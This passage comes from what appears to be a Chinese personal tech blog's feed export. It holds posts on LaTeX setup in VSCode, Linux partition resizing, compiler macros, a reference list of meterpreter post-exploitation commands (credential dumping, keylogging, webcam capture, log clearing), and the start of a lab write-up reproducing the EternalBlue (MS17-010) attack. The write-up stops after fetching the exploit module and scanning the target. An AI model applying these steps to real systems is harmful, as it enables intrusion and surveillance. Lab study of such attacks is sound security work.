rel="noopener">中科大镜像站</a></p></li><li><p><strong>添加环境变量</strong>，并确认可用性</p></li></ul><div class="hljs"><pre><code class="hljs bash">λ tex -vTeX 3.14159265 (TeX Live 2019/W32TeX)kpathsea version 6.3.1Copyright 2019 D.E. Knuth.There is NO warranty.  Redistribution of this software iscovered by the terms of both the TeX copyright andthe Lesser GNU General Public License.For more information about these matters, see the filenamed COPYING and the TeX <span class="hljs-built_in">source</span>.Primary author of TeX: D.E. Knuth.</code></pre></div><h2 id="2-配置VSCode"><a href="#2-配置VSCode" class="headerlink" title="2 配置VSCode"></a>2 配置VSCode</h2><h3 id="2-1-安装LaTeX-Workshop插件"><a href="#2-1-安装LaTeX-Workshop插件" class="headerlink" title="2.1 安装LaTeX-Workshop插件"></a>2.1 安装LaTeX-Workshop插件</h3><p><img src="https://raw.githubusercontent.com/QGrain/picgo-bed/master/figure/20200304155204.png" srcset="/img/loading.gif"></p><h3 id="2-2-设置VSCode配置文件"><a href="#2-2-设置VSCode配置文件" class="headerlink" title="2.2 设置VSCode配置文件"></a>2.2 设置VSCode配置文件</h3><p><code>settings.json</code></p><div class="hljs"><pre><code class="hljs JSON">&#123;"latex-workshop.latex.recipes": [        &#123;            "name": "lualatex-&gt;bibtex-&gt;lualatex*2",            "tools": [                "lualatex",                "bibtex",                "lualatex",                "lualatex",            ]        &#125;    ],    "latex-workshop.latex.tools": [        &#123;            "name": "lualatex",            "command": "lualatex",            "args": [                "-synctex=1",                "-interaction=nonstopmode",                "-file-line-error",                "%DOCFILE%"            ]        &#125;,        &#123;            "name": "bibtex",            "command": "bibtex",            "args": [                "%DOCFILE%"            ]        &#125;,    ],    "latex-workshop.view.pdf.viewer": "tab",    # "latex-workshop.latex.autoBuild.run": "never"&#125;</code></pre></div><h3 id="2-3-使用说明"><a href="#2-3-使用说明" class="headerlink" title="2.3 使用说明"></a>2.3 使用说明</h3><ul><li><p>当你在VSCode编辑<code>.tex</code>格式的文件时，LaTeX-Workshop插件会开始工作</p></li><li><p>编译生成pdf的指令为<code>Ctrl + Alt + B</code></p></li><li><p><code>Ctrl + S</code>保存文件的同时会默认执行编译，若想去除此机制，可以在json设置文件中的加入：</p><div class="hljs"><pre><code class="hljs json">"latex-workshop.latex.autoBuild.run": "never"</code></pre></div></li></ul><h2 id="3-用LaTeX编译第一个pdf"><a href="#3-用LaTeX编译第一个pdf" class="headerlink" title="3 用LaTeX编译第一个pdf"></a>3 用LaTeX编译第一个pdf</h2><p>新建<code>hello.tex</code>文件</p><div class="hljs"><pre><code class="hljs tex"><span class="hljs-tag">\<span class="hljs-name">documentclass</span><span class="hljs-string">&#123;article&#125;</span></span>  <span class="hljs-comment">% 选择模版，使用Latex自带的article模版</span><span class="hljs-tag">\<span class="hljs-name">author</span><span class="hljs-string">&#123;my name&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">title</span><span class="hljs-string">&#123;Title&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">usepackage</span><span class="hljs-string">&#123;graphicx&#125;</span></span>   <span class="hljs-comment">% 插入图片用到的宏包</span><span class="hljs-tag">\<span class="hljs-name">usepackage</span><span class="hljs-string">&#123;multirow&#125;</span></span>   <span class="hljs-comment">% 插入表格用到的宏包</span><span class="hljs-tag">\<span class="hljs-name">begin</span><span class="hljs-string">&#123;document&#125;</span></span> <span class="hljs-tag">\<span class="hljs-name">maketitle</span></span>    <span class="hljs-tag">\<span class="hljs-name">section</span><span class="hljs-string">&#123;Hello China&#125;</span></span> China is in East Asia. <span class="hljs-tag">\<span class="hljs-name">subsection</span><span class="hljs-string">&#123;Hello Hubei&#125;</span></span> Hubei Province is located in central China.    <span class="hljs-tag">\<span class="hljs-name">subsubsection</span><span class="hljs-string">&#123;Hello Wuhan&#125;</span></span>         <span class="hljs-tag">\<span class="hljs-name">paragraph</span><span class="hljs-string">&#123;HUST&#125;</span></span>is Huazhong University of Science and Technology.         <span class="hljs-tag">\<span class="hljs-name">subparagraph</span><span class="hljs-string">&#123;Dian Group&#125;</span></span> is a student innovation technology team.    <span class="hljs-tag">\<span class="hljs-name">subsection</span><span class="hljs-string">&#123;Test&#125;</span></span>        <span class="hljs-tag">\<span class="hljs-name">centering</span></span>        <span class="hljs-tag">\<span class="hljs-name">begin</span><span class="hljs-string">&#123;tabular&#125;</span><span class="hljs-string">&#123;|c|c|c|c|&#125;</span></span>         <span class="hljs-tag">\<span class="hljs-name">hline</span></span>         t &amp; e &amp; s &amp; t<span class="hljs-tag">\<span class="hljs-name">\</span></span>         <span class="hljs-tag">\<span class="hljs-name">hline</span></span>         1 &amp; 2 &amp; 3 &amp; 4<span class="hljs-tag">\<span class="hljs-name">\</span></span>         <span class="hljs-tag">\<span class="hljs-name">hline</span></span>         <span class="hljs-tag">\<span class="hljs-name">end</span><span class="hljs-string">&#123;tabular&#125;</span></span><span class="hljs-tag">\<span class="hljs-name">end</span><span class="hljs-string">&#123;document&#125;</span></span></code></pre></div>]]></content>
    
    
    <categories>
      
      <category>Configuration</category>
      
    </categories>
    
    
    <tags>
      
      <tag>LaTeX</tag>
      
      <tag>VSCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux磁盘分区扩容</title>
    <link href="/2019/12/12/Linux%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA%E6%89%A9%E5%AE%B9/"/>
    <url>/2019/12/12/Linux%E7%A3%81%E7%9B%98%E5%88%86%E5%8C%BA%E6%89%A9%E5%AE%B9/</url>
    
    <content type="html"><![CDATA[<p>在主系统以外的系统(无论是虚拟机还是多系统)分配磁盘空间时我们常常<strong>比较保守</strong>，可能会面临需要扩容根分区的情况。<a id="more"></a></p><h1 id="Linux磁盘分区扩容（非LVM）"><a href="#Linux磁盘分区扩容（非LVM）" class="headerlink" title="Linux磁盘分区扩容（非LVM）"></a>Linux磁盘分区扩容（非LVM）</h1><h2 id="1-适用场景"><a href="#1-适用场景" class="headerlink" title="1 适用场景"></a>1 适用场景</h2><p>在为主系统以外的系统(无论是虚拟机还是多系统)分配磁盘空间时我们常常<strong>比较保守</strong>，这样可能会遇到根分区空间不足的情况，如图：</p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191102191126.png" srcset="/img/loading.gif"></p><p>但是我们的磁盘上还有空闲的空间未使用。因此我们可以将未使用部分扩展到相邻的分区中。</p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191102192359.png" srcset="/img/loading.gif"></p><h2 id="2-实现"><a href="#2-实现" class="headerlink" title="2 实现"></a>2 实现</h2><h3 id="2-1-进入rescue-mode"><a href="#2-1-进入rescue-mode" class="headerlink" title="2.1 进入rescue mode"></a>2.1 进入rescue mode</h3><ul><li><p>如果**扩容的对象是根分区(系统分区)**，则首先需要进入rescue mode。如果扩容对象为非系统分区，如&#x2F;home等，则不需要进入rescue mode。</p><p>一个简单判定是否需要进入rescue mode 或者使用安装镜像U盘启动的方法是，<code>umount</code>此次扩容的对象，操作系统是否会受到影响。</p><ul><li>键入命令<code>init 1</code>（单用户模式，仅root）进入到rescue mode</li></ul><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191102205559.png" srcset="/img/loading.gif"></p><ul><li>或者在grub界面选择advanced启动项里的recovery mode</li></ul><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191102205706.png" srcset="/img/loading.gif"></p><p>最终还是进入到此界面</p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191102210135.png" srcset="/img/loading.gif"></p></li></ul><h3 id="2-2-删除待扩容的分区"><a href="#2-2-删除待扩容的分区" class="headerlink" title="2.2 删除待扩容的分区"></a>2.2 删除待扩容的分区</h3><ul><li><code>fdisk /dev/sda</code> 打开<strong>fdisk</strong>工具，键入<code>p</code>打印当前&#x2F;dev&#x2F;sda磁盘的信息：</li></ul><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191102210505.png" srcset="/img/loading.gif"></p><ul><li>依次键入<code>d</code>，<code>2</code>，删除&#x2F;dev&#x2F;sda2分区</li></ul><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191102210624.png" srcset="/img/loading.gif"></p><h3 id="2-3-新建分区"><a href="#2-3-新建分区" class="headerlink" title="2.3 新建分区"></a>2.3 新建分区</h3><ul><li><p>依次键入<code>n</code>，<code>p</code>，<code>2</code>，<code>no</code>，来重新创建&#x2F;dev&#x2F;sda2。由于之前删除该分区后使得它与此磁盘上未使用的空间合并，因此创建新分区时能够通过指定<code>start</code>和<code>end</code>来扩大新分区的容量。</p><p>注意在被询问是否移除新分区&#x2F;dev&#x2F;sda2带有的<strong>signature</strong>时，选择no，否则该分区原有的数据会丢失。</p></li></ul><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191102210932.png" srcset="/img/loading.gif"></p><ul><li>如果此过程操作无误可以键入<code>w</code>保存并退出。如果有问题可以键入<code>q</code>不保存并退出。</li></ul><h3 id="2-4-更新分区表"><a href="#2-4-更新分区表" class="headerlink" title="2.4 更新分区表"></a>2.4 更新分区表</h3><ul><li><p>此时<code>df -h</code>查看的结果是待扩容分区容量仍然未发生变化，因为还需要<strong>调整分区表</strong>。</p></li><li><p><code>e2fsck -f /dev/sda2</code>检查分区信息</p></li><li><p>调整分区大小。有两种方法：</p><ul><li><p>一种是卸载待扩容分区，然后运行<code>resize2fs -f /dev/sda2</code></p></li><li><p>另一种是不用卸载，在线扩容。不卸载 &#x2F; 分区直接运行<code>resize2fs -f /dev/sda2</code>会得到如下报错：</p></li></ul><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191102212415.png" srcset="/img/loading.gif"></p><p>因此需要重新挂载<code>/</code>分区为<strong>可读写模式</strong><code>mount -o remount, rw /</code>，然后就可以调整分区大小了。且未使用的空间被格式化为和根分区一致的ext4。</p><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191102212921.png" srcset="/img/loading.gif"></p></li><li><p>reboot之后查看结果。发现之前空闲的6.4G空间已经并入待扩容的根分区。<strong>扩容成功</strong></p></li></ul><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191102213630.png" srcset="/img/loading.gif"></p><h2 id="3-一点补充"><a href="#3-一点补充" class="headerlink" title="3 一点补充"></a>3 一点补充</h2><p>后期分别在不同的系统上做过尝试，发现有的Linux发行版需要重新挂载&#x2F;分区来更新分区表大小，比如Kali。而有的发行版比如CentOS，Ubuntu则不需要，进入操作系统后可以直接resize2fs</p><h1 id="Linux磁盘分区扩容（LVM）"><a href="#Linux磁盘分区扩容（LVM）" class="headerlink" title="Linux磁盘分区扩容（LVM）"></a>Linux磁盘分区扩容（LVM）</h1><p>TODO</p>]]></content>
    
    
    <categories>
      
      <category>Tricks</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>各个平台和编译器预定义的宏</title>
    <link href="/2019/11/14/%E5%90%84%E4%B8%AA%E5%B9%B3%E5%8F%B0%E5%92%8C%E7%BC%96%E8%AF%91%E5%99%A8%E9%A2%84%E5%AE%9A%E4%B9%89%E7%9A%84%E5%AE%8F/"/>
    <url>/2019/11/14/%E5%90%84%E4%B8%AA%E5%B9%B3%E5%8F%B0%E5%92%8C%E7%BC%96%E8%AF%91%E5%99%A8%E9%A2%84%E5%AE%9A%E4%B9%89%E7%9A%84%E5%AE%8F/</url>
    
    <content type="html"><![CDATA[<p>在跨平台编程中，通过宏来区分不同的平台是一种较为常见的方法。</p><a id="more"></a><h2 id="1-不同平台"><a href="#1-不同平台" class="headerlink" title="1 不同平台"></a>1 不同平台</h2><h3 id="1-1-Windows"><a href="#1-1-Windows" class="headerlink" title="1.1 Windows"></a>1.1 Windows</h3><div class="hljs"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN32</span><span class="hljs-comment">//is defined for windows (32-bit and 64-bit)</span><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span><span class="hljs-comment">//windows 64bits</span><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><span class="hljs-comment">//define something for  windows (32-bit only)</span><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><span class="hljs-comment">//GUI App</span><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WINDOWS</span><span class="hljs-comment">//CUI App</span><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _CONSOLE</span><span class="hljs-comment">//Windows Versions</span><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> WINVER <span class="hljs-comment">// or #ifdef _WIN32_WINNT</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> (WINVER &gt;= 0x030a) <span class="hljs-comment">//Windows 3.1 and above</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> (WINVER &gt;= 0x0400) <span class="hljs-comment">//Windows 95/NT4.0 and above</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> (WINVER &gt;= 0x0410) <span class="hljs-comment">//Windows 98 and above</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> (WINVER &gt;= 0x0500) <span class="hljs-comment">//Windows Me/2000 and above</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> (WINVER &gt;= 0x0501) <span class="hljs-comment">//Windows XP and above</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> (WINVER &gt;= 0x0600) <span class="hljs-comment">//Windows Vista and above</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> (WINVER &gt;= 0x0601) <span class="hljs-comment">//Windows 7 and above</span></span><span class="hljs-comment">//DOS</span><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __DOS__</span><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __MSDOS__</span><span class="hljs-comment">//Cygwin</span><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __CYGWIN__</span></code></pre></div><h3 id="1-2-Unix"><a href="#1-2-Unix" class="headerlink" title="1.2 Unix"></a>1.2 Unix</h3><div class="hljs"><pre><code class="hljs C"><span class="hljs-comment">//UNIX</span><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __unix</span><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __unix__</span><span class="hljs-comment">//Linux</span><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __linux</span><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __linux__</span><span class="hljs-comment">//FreeBSD</span><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __FreeBSD__</span><span class="hljs-comment">//NetBSD</span><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __NetBSD__</span></code></pre></div><h3 id="1-3-MacOS-amp-iOS"><a href="#1-3-MacOS-amp-iOS" class="headerlink" title="1.3 MacOS &amp; iOS"></a>1.3 MacOS &amp; iOS</h3><div class="hljs"><pre><code class="hljs C"><span class="hljs-comment">// Universal</span><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __APPLE__</span>    <span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">"TargetConditionals.h"</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> TARGET_IPHONE_SIMULATOR</span>    <span class="hljs-comment">// iOS Simulator</span>    <span class="hljs-meta">#<span class="hljs-meta-keyword">elif</span> TARGET_OS_IPHONE</span>        <span class="hljs-comment">// iOS device</span>    <span class="hljs-meta">#<span class="hljs-meta-keyword">elif</span> TARGET_OS_MAC</span>        <span class="hljs-comment">// Other kinds of Mac OS</span>    <span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span>        <span class="hljs-comment">//Unknown Apple platform</span>    <span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><span class="hljs-comment">// Mac OS 9</span><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> Macintosh</span><span class="hljs-comment">//Mac OS X</span><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __APPLE__&amp;&amp;__MACH__</span></code></pre></div><h3 id="1-4-Android"><a href="#1-4-Android" class="headerlink" title="1.4 Android"></a>1.4 Android</h3><div class="hljs"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __ANDROID__</span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __ANDROID_API__ &gt;= 1 <span class="hljs-comment">//Android Version &gt;= 1.0</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __ANDROID_API__ &gt;= 5 <span class="hljs-comment">//Android Version &gt;= 2.0</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __ANDROID_API__ &gt;= 11 <span class="hljs-comment">//Android Version &gt;= 3.0</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __ANDROID_API__ &gt;= 1 <span class="hljs-comment">//Android Version &gt;= 1.0</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __ANDROID_API__ &gt;= 1 <span class="hljs-comment">//Android Version &gt;= 1.0</span></span></code></pre></div><h2 id="2-不同编译器"><a href="#2-不同编译器" class="headerlink" title="2 不同编译器"></a>2 不同编译器</h2><h3 id="2-1-GCC"><a href="#2-1-GCC" class="headerlink" title="2.1 GCC"></a>2.1 GCC</h3><div class="hljs"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __GNUC__</span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __GNUC__ &gt;= 3 <span class="hljs-comment">//GCC-3.0 and above</span></span></code></pre></div><h3 id="2-2-Visual-C"><a href="#2-2-Visual-C" class="headerlink" title="2.2 Visual C++"></a>2.2 Visual C++</h3><div class="hljs"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _MSC_VER (非VC编译器很多地方也有定义)</span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> _MSC_VER &gt;= 1000 <span class="hljs-comment">//MSVC++4.0 and above</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> _MSC_VER &gt;= 1100 <span class="hljs-comment">//MSVC++5.0 and above</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> _MSC_VER &gt;= 1200 <span class="hljs-comment">//MSVC++6.0 and above</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> _MSC_VER &gt;= 1300 <span class="hljs-comment">//MSVC++7.0 and above</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> _MSC_VER &gt;= 1400 <span class="hljs-comment">//MSVC++8.0 and above</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> _MSC_VER &gt;= 1500 <span class="hljs-comment">//MSVC++9.0 (Visual Studio 2008) and above</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> _MSC_VER &gt;= 1600 <span class="hljs-comment">//MSVC++10.0 (Visual Studio 2010) and above</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> _MSC_VER &gt;= 1700 <span class="hljs-comment">//MSVC++11.0 (Visual Studio 2012) and above</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> _MSC_VER &gt;= 1800 <span class="hljs-comment">//MSVC++12.0 (Visual Studio 2013) and above</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> _MSC_VER &gt;= 1900 <span class="hljs-comment">//MSVC++14.0 (Visual Studio 2015) and above</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> _MSC_VER &gt;= 1910 <span class="hljs-comment">//MSVC++14.1 (Visual Studio 2017) and above</span></span></code></pre></div><h3 id="2-3-Borland-C"><a href="#2-3-Borland-C" class="headerlink" title="2.3 Borland C++"></a>2.3 Borland C++</h3><div class="hljs"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __BORLANDC__</span></code></pre></div><h3 id="2-4-CLANG"><a href="#2-4-CLANG" class="headerlink" title="2.4 CLANG"></a>2.4 CLANG</h3><div class="hljs"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span></span></code></pre></div><h2 id="3-其它"><a href="#3-其它" class="headerlink" title="3 其它"></a>3 其它</h2><p>todo</p>]]></content>
    
    
    <categories>
      
      <category>Tricks</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【渗透】meterpreter命令详解</title>
    <link href="/2019/11/14/%E6%B8%97%E9%80%8F-meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"/>
    <url>/2019/11/14/%E6%B8%97%E9%80%8F-meterpreter%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h2 id="1-简介"><a href="#1-简介" class="headerlink" title="1 简介"></a>1 简介</h2><p><strong>meterpreter</strong>是一个为攻击者提供<strong>交互性shell</strong>以便于在目标机器上执行代码的命令行工具。</p><p>它通过注入特定的payload到目标机器内存中的DLL，来实现控制。</p><a id="more"></a><h2 id="2-命令"><a href="#2-命令" class="headerlink" title="2 命令"></a>2 命令</h2><ul><li><code>help</code>：获取帮助文档，里面包含了所有的meterpreter的命令的功能</li></ul><h3 id="2-1-Core-Commands"><a href="#2-1-Core-Commands" class="headerlink" title="2.1 Core Commands"></a>2.1 Core Commands</h3><blockquote><p>meterpreter &gt; ?  帮助菜单</p><p>meterpreter &gt; background 将当前session置于后台</p><p>meterpreter &gt; bgkill kill掉后台某meterpreter的会话</p><p>meterpreter &gt; bgrun 以后台线程的身份执行一个meterpreter的脚本</p><p>meterpreter &gt; channel 显示或控制所有活动的channel</p><p>meterpreter &gt; [read|write] 从channel中读出数据|向channel中写入数据</p><p>meterpreter &gt; close 关闭一个channel</p><p>meterpreter &gt; [enable|disable]_unicode_encoding</p><p>meterpreter &gt; [set|get]_timeouts</p><p>meterpreter &gt; [uuid|guid]</p><p>meterpreter &gt; info</p><p>meterpreter &gt; irb</p><p>meterpreter &gt; load</p><p>meterpreter &gt; machine_id</p><p>meterpreter &gt; migrate</p><p>meterpreter &gt; pivot</p><p>meterpreter &gt; resource</p><p>meterpreter &gt; run</p><p>meterpreter &gt; sessions</p><p>meterpreter &gt; transport</p></blockquote><h3 id="2-2-File-System-Commands"><a href="#2-2-File-System-Commands" class="headerlink" title="2.2 File System Commands"></a>2.2 File System Commands</h3><div class="hljs"><pre><code class="hljs shell">meterpreter &gt; catmeterpreter &gt; cdmeterpreter &gt; checksummeterpreter &gt; [cp|lcd]meterpreter &gt; dirmeterpreter &gt; [ls|lls]meterpreter &gt; [download|upload]meterpreter &gt; editmeterpreter &gt; [getlwd|getwd]meterpreter &gt; [pwd|lpwd]meterpreter &gt; [mkdir|rmdir]meterpreter &gt; mvmeterpreter &gt; rmmeterpreter &gt; searchmeterpreter &gt; show_mount</code></pre></div><h3 id="2-3-Networking-Commands"><a href="#2-3-Networking-Commands" class="headerlink" title="2.3 Networking Commands"></a>2.3 Networking Commands</h3><ul><li>arp</li><li>getproxy</li><li>ifconfig</li><li>ipconfig</li><li>netstat</li><li>portfwd</li><li>resolve</li><li>route</li></ul><h3 id="2-4-System-Commands"><a href="#2-4-System-Commands" class="headerlink" title="2.4 System Commands"></a>2.4 System Commands</h3><ul><li>clearev</li><li>drop_token</li><li>execute</li><li>getenv</li><li>getpid</li><li>getprivs</li><li>getsid</li><li>getuid</li><li>kill</li><li>localtime</li><li>pgrep</li><li>pkill</li><li>ps</li><li>reboot</li><li>reg</li><li>rev2self</li><li>shell</li><li>shutdown</li><li>steal_token</li><li>suspend</li><li>sysinfo</li></ul><h3 id="2-5-User-interface-Commands"><a href="#2-5-User-interface-Commands" class="headerlink" title="2.5 User interface Commands"></a>2.5 User interface Commands</h3><ul><li>enumdesktops</li><li>getdesktop</li><li>idletime</li><li>keyscan_[dump|start|stop]</li><li>screenshot</li><li>setdesktop</li><li>uictl</li></ul><h3 id="2-6-Webcam-Commands"><a href="#2-6-Webcam-Commands" class="headerlink" title="2.6 Webcam Commands"></a>2.6 Webcam Commands</h3><ul><li>record_mic</li><li>webcam_chat</li><li>webcam_list</li><li>webcam_snap</li><li>webcam_stream</li></ul><h3 id="2-7-Audio-Poutput-Commands"><a href="#2-7-Audio-Poutput-Commands" class="headerlink" title="2.7 Audio Poutput Commands"></a>2.7 Audio Poutput Commands</h3><ul><li>play</li></ul><h3 id="2-8-Elevate-Commands"><a href="#2-8-Elevate-Commands" class="headerlink" title="2.8 Elevate Commands"></a>2.8 Elevate Commands</h3><ul><li>getsystem</li></ul><h3 id="2-9-Password-database-Commands"><a href="#2-9-Password-database-Commands" class="headerlink" title="2.9 Password database Commands"></a>2.9 Password database Commands</h3><ul><li>hashdump</li></ul><h3 id="2-10-Timestomp-Commands"><a href="#2-10-Timestomp-Commands" class="headerlink" title="2.10 Timestomp Commands"></a>2.10 Timestomp Commands</h3><ul><li>timestomp</li></ul>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kali</tag>
      
      <tag>Penetration</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【渗透】MS17-010漏洞复现</title>
    <link href="/2019/11/14/%E6%B8%97%E9%80%8F-MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <url>/2019/11/14/%E6%B8%97%E9%80%8F-MS17-010%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1 漏洞原理"></a>1 漏洞原理</h2><h3 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h3><p><strong>EternalBlue(在微软的MS17-010中被修复)是在Windows的SMB服务处理SMB v1请求时发生的漏洞，这个漏洞导致攻击者在目标系统上可以执行任意代码。</strong></p><p>从EternalBlue这个Exploit被影子经纪人公布到互联网上后，就成为了“明星”。这个Exploit被多款恶意软件利用。包括肆虐的<strong>WannaCrypt</strong>，无文件的勒索软件<strong>UIWIX</strong>和SMB蠕虫<strong>EternalRocks</strong>。</p><a id="more"></a><h3 id="1-2-漏洞简析"><a href="#1-2-漏洞简析" class="headerlink" title="1.2 漏洞简析"></a>1.2 漏洞简析</h3><p><strong>Eternalblue利用了3个不同的bug</strong></p><ul><li>第一个是内核态函数<strong>srv!SrvOs2FeaListToNt</strong>在处理FEA(File Extended Attributes)转换时，由于错误地使用的<strong>WORD强制类型转换</strong>，导致在大非分页池(内核的数据结构，Large Non-Paged Kernel Pool)的<strong>缓冲区溢出</strong>。</li><li>第二个漏洞可以触发缓冲区溢出，这是由于SMB协议定义的两个子命令SMB_COM_TRANSACTION2和SMB_COM_NT_TRANSACT的差别。如果有太多的数据要包含在一个单独的包中，就需要_SECONDARY命令。TRANSACTION2和NT_TRANSACT的关键区别在于<strong>后者调用的数据包是前者大小的2倍</strong>。如果客户端使用NT_TRANSACT子命令在TRANSACTION2子命令前发送伪造的消息，就会出现验证错误。如果协议发现接收了2个分开的子命令，就会根据最后接收的包的类型来分配类型和大小。因为最后接收的包比较小，所以第一个包会占用比分配空间更多的空间。</li><li>一旦攻击者完成初始的溢出，就可以利用SMB v1中的第3个漏洞来进行Heap Spraying(堆喷射)，导致在给定地址分配一块内存。然后，攻击者就可以写入和执行shellcode来控制系统。</li></ul><h2 id="2-漏洞复现"><a href="#2-漏洞复现" class="headerlink" title="2 漏洞复现"></a>2 漏洞复现</h2><h3 id="2-1-渗透Windows7-32-bit"><a href="#2-1-渗透Windows7-32-bit" class="headerlink" title="2.1 渗透Windows7 32-bit"></a>2.1 渗透Windows7 32-bit</h3><h4 id="2-1-1-实验环境"><a href="#2-1-1-实验环境" class="headerlink" title="2.1.1 实验环境"></a>2.1.1 实验环境</h4><p><strong>实验平台：</strong></p><ul><li>带有MS17-010漏洞的Windows 7 pro x86， 内部版本7601<ul><li><strong>IP：192.168.188.136</strong></li></ul></li><li>Kali Linux，用于渗透<ul><li><strong>IP：192.168.188.135</strong></li></ul></li></ul><p><strong>实验配置：</strong></p><p>kali没有32位机器的渗透模块，我们需要做以下配置</p><ul><li><strong>安装wine 32</strong></li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># root 权限</span>dpkg --add-architecture i386apt-get updateapt-get install wine32</code></pre></div><ul><li><strong>拉取EternalBlue_Doublepulsar攻击模块</strong></li></ul><div class="hljs"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit<span class="hljs-comment"># 将模块拷贝到msf的相应目录</span><span class="hljs-built_in">cd</span> Eternalblue-Doublepulsar-metasploitcp -r deps/ eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb/</code></pre></div><ul><li><strong>运行postgresql</strong></li></ul><div class="hljs"><pre><code class="hljs bash">service postgresql start</code></pre></div><h4 id="2-1-2-信息搜集"><a href="#2-1-2-信息搜集" class="headerlink" title="2.1.2 信息搜集"></a>2.1.2 信息搜集</h4><ul><li><strong>nmap扫描</strong></li></ul><div class="hljs"><pre><code class="hljs bash"><span class="hljs-comment"># root 权限</span>namp -sS -sV -Pn 192.168.188.136</code></pre></div><p><img src="https://raw.githubusercontent.com/QGrain/picBed/master/img/20191107174140.png" srcset="/img/loading.gif"></p><p>发现该win7开放了445端口，可进一步采用msfconsole进行扫描分析</p><ul><li><strong>查看并使用辅助扫描模块测试目标是否可攻击</strong></li></ul><div 